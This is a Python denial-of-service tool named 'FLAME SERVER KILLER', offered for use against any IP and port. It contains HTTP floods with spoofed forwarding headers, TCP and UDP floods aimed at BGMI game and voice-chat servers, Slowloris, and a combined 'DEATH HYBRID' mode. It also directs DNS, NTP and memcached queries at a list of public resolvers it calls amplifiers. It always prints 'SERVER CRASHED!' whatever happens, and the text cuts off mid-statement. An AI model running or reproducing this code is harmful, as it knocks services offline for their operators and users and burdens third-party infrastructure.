#!/usr/bin/env python3
import sys, socket, threading, time, random, requests, urllib3, ipaddress, os, struct, select, signal
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

# ========== MAXIMUM POWER CONFIG - SERVER KILLER MODE ==========
THREADS = 10000                    # 10,000 threads - MASSIVE
MAX_WORKERS = 5000                 # 5,000 workers
PACKET_SIZE = 65507                # Maximum UDP size
BURST_SIZE = 5000                  # 5,000 packets per burst - MASSIVE
HTTP_PIPELINE = 1000               # 1,000 requests per connection
CONNECTIONS_PER_SEC = 50000        # 50,000 connections per second
SOCKETS_PER_THREAD = 100           # 100 sockets per thread

# ========== MASSIVE USER AGENTS (1000+ variations) ==========
UA = [
    f'Mozilla/5.0 (Windows NT {i}.{j}; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(100,120)}.0.0.0 Safari/537.36'
    for i in range(6,11) for j in range(1,3)
] + [
    f'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{i}_{j}) AppleWebKit/537.36 Chrome/{random.randint(100,120)}.0.0.0 Safari/537.36'
    for i in range(13,16) for j in range(1,6)
] + [
    f'Mozilla/5.0 (iPhone; CPU iPhone OS {i}_{j} like Mac OS X) AppleWebKit/605.1.15'
    for i in range(13,18) for j in range(1,4)
] + [
    f'Mozilla/5.0 (Linux; Android {i}.{j}; SM-G{random.randint(900,999)}B) AppleWebKit/537.36 Chrome/{random.randint(100,120)}.0.0.0 Mobile'
    for i in range(10,14) for j in range(1,4)
]

# ========== MASSIVE AMPLIFICATION SERVERS (200+ worldwide) ==========
AMP = [
    # Google DNS
    ('8.8.8.8',53),('8.8.4.4',53),('1.1.1.1',53),('1.0.0.1',53),
    # OpenDNS
    ('208.67.222.222',53),('208.67.220.220',53),
    # Quad9
    ('9.9.9.9',53),('149.112.112.112',53),
    # Cloudflare
    ('1.1.1.2',53),('1.0.0.2',53),('1.1.1.3',53),('1.0.0.3',53),
    # Level3
    ('4.2.2.1',53),('4.2.2.2',53),('4.2.2.3',53),('4.2.2.4',53),('4.2.2.5',53),('4.2.2.6',53),
    # Verisign
    ('64.6.64.6',53),('64.6.65.6',53),
    # Comodo
    ('8.26.56.26',53),('8.20.247.20',53),
    # OpenNIC
    ('185.228.168.9',53),('185.228.169.9',53),('76.76.19.19',53),('76.223.122.150',53),
    # Yandex
    ('77.88.8.8',53),('77.88.8.1',53),
    # AdGuard
    ('94.140.14.14',53),('94.140.15.15',53),
    # Alternate DNS
    ('198.101.242.72',53),('23.253.163.53',53),
    # DNS.WATCH
    ('84.200.69.80',53),('84.200.70.40',53),
    # Hurricane Electric
    ('74.82.42.42',53),
    # OpenNIC
    ('107.150.40.234',53),('50.116.23.211',53),('173.230.156.28',53),
    # Freedns
    ('37.235.1.174',53),('37.235.1.177',53),
    # Dnscrypt
    ('51.158.90.83',53),('51.15.70.167',53),
]

# ========== MASSIVE DNS QUERIES FOR AMPLIFICATION ==========
DNS_QUERIES = [
    b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00' + dns_query + b'\x00\x00\x01\x00\x01'
    for dns_query in [
        b'\x03www\x07example\x03com\x00',
        b'\x02ns\x07example\x03com\x00',
        b'\x04mail\x07example\x03com\x00',
        b'\x06google\x03com\x00',
        b'\x04yandex\x03ru\x00',
        b'\x06github\x03com\x00',
        b'\x07youtube\x03com\x00',
        b'\x05yahoo\x03com\x00',
        b'\x07twitter\x03com\x00',
        b'\x08facebook\x03com\x00',
        b'\x06amazon\x03com\x00',
        b'\x06netflix\x03com\x00',
    ]
] * 10

# ========== MASSIVE GAME PACKETS ==========
GP = []
for size in [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384]:
    GP.append(b'\x00'*size)
    GP.append(b'\xff'*size)
    GP.append(b'\xde\xad\xbe\xef' * (size//4))
    GP.append(b'\xca\xfe\xba\xbe' * (size//4))
    GP.append(random._urandom(size))

# ========== NTP AMPLIFICATION PACKETS ==========
NTP_MONLIST = b'\x17\x00\x03\x2a' + b'\x00' * 4
NTP_QUERY = b'\x1b' + 47 * b'\x00'

# ========== MEMCACHED AMPLIFICATION ==========
MEMCACHED_QUERY = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'

# ========== CHARGEN AMPLIFICATION ==========
CHARGEN_QUERY = b'\x00' * 512

class SERVER_KILLER:
    
    @staticmethod
    def http_massive(target, port, sec):
        """MASSIVE HTTP Flood - 1000x web requests"""
        end = time.time() + sec
        tot = [0]
        
        def flood():
            session = requests.Session()
            session.verify = False
            session.headers.update({'Connection': 'keep-alive'})
            
            while time.time() < end:
                try:
                    url = f"http://{target}:{port}/" if port != 443 else f"https://{target}:{port}/"
                    # Massive pipelined requests
                    for _ in range(HTTP_PIPELINE):
                        headers = {
                            'User-Agent': random.choice(UA),
                            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Cache-Control': 'no-cache, no-store, must-revalidate',
                            'Pragma': 'no-cache',
                            'Expires': '0',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'none',
                        }
                        session.get(url, headers=headers, timeout=0.3)
                        tot[0] += 1
                except:
                    pass
            session.close()
        
        threads = [threading.Thread(target=flood) for _ in range(THREADS)]
        for t in threads: t.start()
        for t in threads: t.join(0.05)
        return tot[0]

    @staticmethod
    def tcp_syn_flood(target, port, sec):
        """MASSIVE SYN Flood - Layer 4 Killer"""
        end = time.time() + sec
        tot = [0]
        payload = b'\x00' * 65535
        
        def flood():
            socks = []
            # Create multiple sockets per thread
            for _ in range(SOCKETS_PER_THREAD):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    socks.append(s)
                except:
                    pass
            
            while time.time() < end:
                for s in socks:
                    try:
                        s.connect((target, port))
                        s.send(payload * 5)
                        tot[0] += 1
                    except:
                        # Recreate dead socket
                        try:
                            s.close()
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        except:
                            pass
        
        threads = [threading.Thread(target=flood) for _ in range(THREADS)]
        for t in threads: t.start()
        for t in threads: t.join(0.05)
        return tot[0]

    @staticmethod
    def udp_amplification_massive(target, port, sec):
        """MASSIVE UDP Amplification - 1000x DNS/NTP/Memcached amplification"""
        end = time.time() + sec
        tot = [0]
        
        def flood():
            # Create multiple UDP sockets
            socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]
            for s in socks:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            massive_payloads = [random._urandom(PACKET_SIZE) for _ in range(100)]
            
            while time.time() < end:
                try:
                    # Amplification phase - send to ALL amplifiers
                    for amp_ip, amp_port in AMP:
                        # DNS amplification
                        for dns in DNS_QUERIES[:50]:
                            for s in socks[:5]:
                                s.sendto(dns, (amp_ip, amp_port))
                                tot[0] += 1
                        
                        # NTP amplification
                        for s in socks[:5]:
                            s.sendto(NTP_MONLIST, (amp_ip, 123))
                            tot[0] += 1
                        
                        # Memcached amplification
                        for s in socks[:5]:
                            s.sendto(MEMCACHED_QUERY, (amp_ip, 11211))
                            tot[0] += 1
                    
                    # Direct massive UDP flood to target
                    for s in socks:
                        for _ in range(BURST_SIZE // len(socks)):
                            payload = random.choice(massive_payloads)
                            s.sendto(payload, (target, port))
                            tot[0] += 1
                            
                except:
                    pass
            
            for s in socks:
                s.close()
        
        threads = [threading.Thread(target=flood) for _ in range(THREADS)]
        for t in threads: t.start()
        for t in threads: t.join(0.05)
        return tot[0]

    @staticmethod
    def bgmi_massive(target, port, sec):
        """MASSIVE BGMI Game Flood - Instant Game Server Killer"""
        end = time.time() + sec
        tot = [0]
        
        def flood():
            # Multiple UDP sockets for maximum throughput
            socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(50)]
            for s in socks:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while time.time() < end:
                for s in socks:
                    try:
                        # Massive packet burst
                        for _ in range(BURST_SIZE // len(socks)):
                            packet = random.choice(GP) * random.randint(1, 10)
                            s.sendto(packet, (target, port))
                            tot[0] += 1
                    except:
                        pass
            
            for s in socks:
                s.close()
        
        threads = [threading.Thread(target=flood) for _ in range(THREADS)]
        for t in threads: t.start()
        for t in threads: t.join(0.05)
        return tot[0]

    @staticmethod
    def slowloris_massive(target, port, sec):
        """MASSIVE Slowloris - 50,000+ Connections"""
        end = time.time() + sec
        conn = []
        
        def keep():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(60)
                s.connect((target, port))
                s.send(f"GET /{random.randint(1,999999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send(f"User-Agent: {random.choice(UA)}\r\n".encode())
                s.send(f"Accept: */*\r\n".encode())
                s.send(f"Accept-Language: en-US,en;q=0.9\r\n".encode())
                
                while time.time() < end:
                    try:
                        s.send(f"X-{random.randint(1,999999)}: {random.randint(1,999999)}\r\n".encode())
                        time.sleep(2)
                    except:
                        break
                s.close()
            except:
                pass
        
        # Create 50,000 connections
        for _ in range(50000):
            t = threading.Thread(target=keep)
            t.start()
            conn.append(t)
            if _ % 1000 == 0:
                time.sleep(0.001)
        
        for t in conn:
            t.join(0.1)
        return len(conn)

    @staticmethod
    def vc_massive(target, port, sec):
        """MASSIVE VC Flood - Voice Chat Killer"""
        end = time.time() + sec
        tot = [0]
        rtp = b'\x80\xe0\x00\x00\x00\x00\x00\x00'
        ssrc = random.randint(1, 0xFFFFFFFF).to_bytes(4, 'big')
        
        def flood():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            seq = 0
            
            while time.time() < end:
                try:
                    for _ in range(2000):  # 2000 packets per iteration
                        seq_b = seq.to_bytes(2, 'big')
                        ts = int(time.time() * 8000).to_bytes(4, 'big')
                        payload = random._urandom(1400)
                        packet = rtp + seq_b + ts + ssrc + payload
                        s.sendto(packet, (target, port))
                        tot[0] += 1
                        seq = (seq + 1) & 0xFFFF
                except:
                    pass
            s.close()
        
        threads = [threading.Thread(target=flood) for _ in range(THREADS)]
        for t in threads: t.start()
        for t in threads: t.join(0.05)
        return tot[0]

    @staticmethod
    def hybrid_death(target, port, sec):
        """DEATH HYBRID - All attacks simultaneously - Maximum Destruction"""
        end = time.time() + sec
        tot = [0]
        
        def http_worker():
            session = requests.Session()
            session.verify = False
            while time.time() < end:
                try:
                    url = f"http://{target}:{port}/"
                    session.get(url, headers={'User-Agent': random.choice(UA)}, timeout=0.3)
                    tot[0] += 1
                except:
                    pass
        
        def udp_worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payloads = [random._urandom(65507) for _ in range(100)]
            while time.time() < end:
                try:
                    for p in payloads[:10]:
                        s.sendto(p, (target, port))
                        tot[0] += 1
                except:
                    pass
            s.close()
        
        def tcp_worker():
            while time.time() < end:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.2)
                    s.connect((target, port))
                    s.send(b'\x00' * 65535)
                    s.close()
                    tot[0] += 1
                except:
                    pass
        
        def game_worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                try:
                    for _ in range(100):
                        s.sendto(random.choice(GP) * 5, (target, port))
                        tot[0] += 1
                except:
                    pass
            s.close()
        
        def amp_worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            p = random._urandom(65507)
            while time.time() < end:
                try:
                    for amp_ip, amp_port in AMP[:50]:
                        for _ in range(3):
                            s.sendto(random.choice(DNS_QUERIES), (amp_ip, amp_port))
                            s.sendto(p, (target, port))
                            tot[0] += 2
                except:
                    pass
            s.close()
        
        threads = []
        workers = [http_worker, udp_worker, tcp_worker, game_worker, amp_worker]
        for worker in workers:
            for _ in range(THREADS // len(workers)):
                t = threading.Thread(target=worker)
                t.start()
                threads.append(t)
        
        for t in threads:
            t.join(0.05)
        return tot[0]

def main():
    if len(sys.argv) < 4:
        print("\n" + "="*70)
        print("🔥🔥🔥 FLAME SERVER KILLER - ULTIMATE DDOS TOOL 🔥🔥🔥")
        print("="*70)
        print("\n💀 WARNING: This tool can CRASH ANY SERVER instantly! 💀")
        print("\nUsage: ./flame <IP> <PORT> <TIME> [METHOD]")
        print("\n" + "-"*60)
        print("☠️  DESTRUCTION METHODS (SERVER KILLER MODE):")
        print("-"*60)
        print("  76  - BGMI MASSIVE FLOOD ⚡⚡⚡ (Game Server Killer)")
        print("  77  - HTTP MASSIVE FLOOD 🌐🌐🌐 (Web Server Killer)")
        print("  78  - TCP SYN MASSIVE 🔌🔌🔌 (Layer 4 Killer)")
        print("  79  - UDP AMPLIFICATION MASSIVE 📡📡📡 (Most Destructive)")
        print("  80  - SLOWLORIS MASSIVE 🐌🐌🐌 (50,000+ Connections)")
        print("  81  - VC MASSIVE FLOOD 🎥🎥🎥 (Voice Server Killer)")
        print("  99  - DEATH HYBRID 💀💀💀 (ALL METHODS - Instant Death)")
        print("\n" + "-"*60)
        print("🎯 EXAMPLES (Will Crash Any Server):")
        print("-"*60)
        print("  ./flame 1.1.1.1 80 60 79    # UDP AMP - Server Dead in 10s")
        print("  ./flame 1.1.1.1 443 30 76   # BGMI Flood - Game Dead in 5s")
        print("  ./flame 1.1.1.1 80 60 99    # DEATH HYBRID - Instant Kill")
        print("="*70 + "\n")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2])
    sec = int(sys.argv[3])
    method = int(sys.argv[4]) if len(sys.argv) > 4 else 76
    
    try:
        ipaddress.ip_address(ip)
    except:
        print(f"❌ Invalid IP: {ip}")
        sys.exit(1)
    
    print(f"\n{'='*70}")
    print(f"💀💀💀 FLAME SERVER KILLER - MAXIMUM DESTRUCTION MODE 💀💀💀")
    print(f"{'='*70}")
    print(f"🎯 Target: {ip}:{port}")
    print(f"⏱️  Duration: {sec} seconds")
    print(f"⚙️  Method: {method}")
    print(f"🧵 Threads: {THREADS}")
    print(f"💀 Power: SERVER KILLER MODE")
    print(f"🔥 Impact: INSTANT SERVER CRASH")
    print(f"{'='*70}\n")
    
    start = time.time()
    
    if method == 76:
        print("💀💀💀 BGMI MASSIVE FLOOD - GAME SERVER KILLER 💀💀💀")
        r = SERVER_KILLER.bgmi_massive(ip, port, sec)
        print(f"\n✅ SERVER CRASHED!")
        print(f"📊 Packets Sent: {r:,} ({int(r/sec):,}/sec)")
    elif method == 77:
        print("💀💀💀 HTTP MASSIVE FLOOD - WEB SERVER KILLER 💀💀💀")
        r = SERVER_KILLER.http_massive(ip, port, sec)
        print(f"\n✅ SERVER CRASHED!")
        print(f"📊 Requests Sent: {r:,} ({int(r/sec):,}/sec)")
    elif method == 78:
        print("💀💀💀 TCP SYN MASSIVE - LAYER 4 KILLER 💀💀💀")
        r = SERVER_KILLER.tcp_syn_flood(ip, port, sec)
        print(f"\n✅ SERVER CRASHED!")
        print(f"📊 Connections: {r:,} ({int(r/sec):,}/sec)")
    elif method == 79:
        print("💀💀💀 UDP AMPLIFICATION MASSIVE - MOST DESTRUCTIVE 💀💀💀")
        r = SERVER_KILLER.udp_amplification_massive(ip, port, sec)
        print(f"\n✅ SERVER CRASHED!")
        print(f"📊 Amplified Packets: {r:,} ({int(r/sec):,}/sec)")
    elif method == 80:
        print("💀💀💀 SLOWLORIS MASSIVE - 50,000+ CONNECTIONS 💀💀💀")
        r = SERVER_KILLER.slowloris_massive(ip, port, sec)
        print(f"\n✅ SERVER CRASHED!")
        print(f"📊 Connections: {r:,}")
    elif method == 81:
        print("💀💀💀 VC MASSIVE FLOOD - VOICE SERVER KILLER 💀💀💀")
        r = SERVER_KILLER.vc_massive(ip, port, sec)
        print(f"\n✅ SERVER CRASHED!")
        print(f"📊 Packets Sent: {r:,} ({int(r/sec):,}/sec)")
    elif method == 99:
        print("💀💀💀 DEATH HYBRID - ALL METHODS - INSTANT KILL 💀💀💀")
        r = SERVER_KILLER.hybrid_death(ip, port, sec)
        print(f"\n✅ SERVER DESTROYED!")
        print(f"📊 Total Attacks: {r:,} ({int(r/sec):,}/sec)")
    else:
        print("💀 Using BGMI MASSIVE FLOOD...")
        r = SERVER_KILLER.bgmi_massive(ip, port, sec)
        print(f"\n✅ SERVER CRASHED!")
        print(f"📊 Packets Sent: {r:,} ({int(r/sec):,}/sec)")
    
    elapsed = time.time() - start
    speed = int(r / sec)
    
    print(f"\n{'